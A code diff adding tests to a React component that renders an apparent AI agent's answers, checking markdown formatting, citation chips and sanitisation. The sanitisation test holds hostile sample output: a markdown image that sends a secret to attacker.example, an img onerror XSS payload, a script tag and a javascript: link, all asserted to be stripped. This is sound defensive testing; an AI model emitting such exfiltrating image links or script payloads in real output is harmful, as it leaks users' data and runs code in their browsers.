@@ -46,12 +46,49 @@ describe("TestResultView", () => {
     expect(html).toContain("<strong>Legal agent</strong>");
     expect(html).toContain("Decided by the planner. The planner chose by the agents&#x27; descriptions.");
     expect(html).toContain("Who signs an 80,000 euro supplier contract?"); // the planner's goal
-    expect(html).toContain("The CFO signs it [S1].");
+    expect(html).toContain("The CFO signs it");
+    expect(html).toContain('aria-label="Source 1: Contract Signature Authority Matrix"'); // [S1] is a chip
     expect(html).toContain("Contract Signature Authority Matrix");
     expect(html).toContain("Tried draft_email: over the tool-call limit, not run");
     expect(html).toContain("4 calls · 3,120 in · 410 out · $0.004 · claude-sonnet-5-5");
     expect(html).toMatch(/<h4 id="test-routing-heading"/);
     expect(html).toContain('aria-labelledby="test-answer-heading"');
+  });
+
+  it("renders the answer as markdown, like the chat: lists, emphasis, tables and citation chips", () => {
+    const formatted = result();
+    formatted.answer = {
+      ...formatted.answer!,
+      text: "Who signs:\n\n- **Up to 25,000 euros:** the department manager [S1]\n- Above: the CFO\n\n| Value | Signs |\n| --- | --- |\n| 80,000 | CFO |",
+    };
+    const html = renderToStaticMarkup(<TestResultView result={formatted} question="q" />);
+    expect(html).toMatch(/<ul[^>]*>\s*<li[^>]*><strong>Up to 25,000 euros:<\/strong>/);
+    expect(html).toContain("<table");
+    expect(html).toMatch(/<button type="button"[^>]*aria-label="Source 1: Contract Signature Authority Matrix"/);
+    expect(html).not.toContain("**");
+    // The chip points at the citation entry, which can take focus.
+    expect(html).toMatch(/<li id="[^"]+-S1" tabindex="-1"/);
+  });
+
+  it("applies the chat's safety rules: no image is loaded, no raw HTML, no javascript: links, links open safely", () => {
+    const hostile = result();
+    hostile.answer = {
+      ...hostile.answer!,
+      text:
+        "Done [S1].\n\n![receipt](https://attacker.example/p?d=CANARY-SECRET)\n\n" +
+        '<img src=x onerror="alert(1)"><script>alert(2)</script>\n\n' +
+        "[open](javascript:alert(3)) and [the matrix](https://intranet.example/legal)",
+    };
+    const html = renderToStaticMarkup(<TestResultView result={hostile} question="q" />);
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+    expect(html).not.toContain("CANARY-SECRET");
+    expect(html).toContain("[receipt]"); // only the alt text
+    expect(html).not.toContain("<script");
+    expect(html).not.toContain("onerror");
+    expect(html).not.toContain("javascript:");
+    expect(html).toContain('href="https://intranet.example/legal"');
+    expect(html).toContain('target="_blank" rel="noopener noreferrer nofollow"');
   });
 
   it("says when the planner did not pick the tested agent", () => {
